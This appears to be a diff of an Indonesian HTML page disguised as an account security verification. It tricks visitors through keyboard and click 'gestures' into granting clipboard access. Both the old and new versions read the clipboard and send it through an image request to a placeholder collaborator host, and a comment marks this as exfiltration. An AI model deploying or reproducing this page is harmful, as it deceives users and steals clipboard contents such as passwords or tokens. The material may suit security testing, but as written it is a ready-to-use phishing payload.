@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Validasi Sistem</title>
+  <title>Validasi Gestur Hybrid</title>
   <style>
     body {
       font-family: sans-serif;
@@ -9,8 +9,8 @@
       padding-top: 100px;
     }
     button {
-      font-size: 18px;
       padding: 12px 24px;
+      font-size: 18px;
       margin-top: 30px;
       cursor: pointer;
     }
@@ -22,51 +22,53 @@
       margin-top: 20px;
       font-weight: bold;
       color: green;
-      white-space: pre-wrap;
     }
   </style>
 </head>
 <body>
 
-  <h2>Validasi Sistem Otomatis</h2>
-  <div id="msg">📌 Tekan tombol ENTER untuk memulai verifikasi</div>
-  <button id="btn" style="display: none;">Lanjutkan Verifikasi</button>
+  <h2>Verifikasi Keamanan Akun</h2>
+  <div id="msg">Tekan ENTER untuk memulai verifikasi...</div>
+  <button id="btn" style="display:none;">Lanjutkan Verifikasi</button>
   <div id="result"></div>
 
   <script>
     let stage = 0;
     let triggered = false;
-    let clipboardCache = "";
 
-    document.addEventListener("keydown", async (e) => {
-      if (e.key !== "Enter" || triggered) return;
+    document.addEventListener("keydown", (e) => {
+      if (e.key !== "Enter") return;
 
       if (stage === 0) {
         stage = 1;
-        document.getElementById("msg").innerText = "✅ Tahap 1 selesai. Sekarang klik tombol di bawah ini.";
+        document.getElementById("msg").innerText = "✅ Tahap 1: Gestur keyboard terdeteksi.\nSekarang klik tombol di bawah.";
         document.getElementById("btn").style.display = "inline-block";
       } else if (stage === 2) {
-        triggered = true;
-        document.getElementById("msg").innerText = "📋 Membaca clipboard...";
-
-        try {
-          const text = await navigator.clipboard.readText();
-          clipboardCache = text;
-          document.getElementById("result").innerText = "📋 Clipboard berisi:\n" + text;
-
-          // exfiltrate
-          const img = new Image();
-          img.src = "https://your-burp-collab.net/log?clip=" + encodeURIComponent(text);
-        } catch (err) {
-          document.getElementById("msg").innerText = "❌ Gagal membaca clipboard: " + err;
-        }
+        document.getElementById("msg").innerText = "✅ Verifikasi selesai.";
+        document.getElementById("result").innerText = "Terima kasih telah memverifikasi!";
       }
     });
 
     document.getElementById("btn").addEventListener("click", () => {
-      if (stage === 1) {
+      if (stage === 1 && !triggered) {
+        triggered = true;
         stage = 2;
-        document.getElementById("msg").innerText = "🟢 Sekarang tekan ENTER sekali lagi untuk menyelesaikan verifikasi.";
+
+        document.getElementById("msg").innerText = "📋 Membaca clipboard...";
+
+        navigator.clipboard.readText()
+          .then(text => {
+            document.getElementById("result").innerText = "📋 Clipboard:\n" + text;
+
+            // Optional: exfiltrate
+            const img = new Image();
+            img.src = "https://your-collab-url.net/log?clip=" + encodeURIComponent(text);
+
+            document.getElementById("msg").innerText = "✅ Clipboard berhasil dibaca.\nTekan ENTER untuk menyelesaikan.";
+          })
+          .catch(err => {
+            document.getElementById("msg").innerText = "❌ Gagal membaca clipboard: " + err;
+          });
       }
     });
   </script>
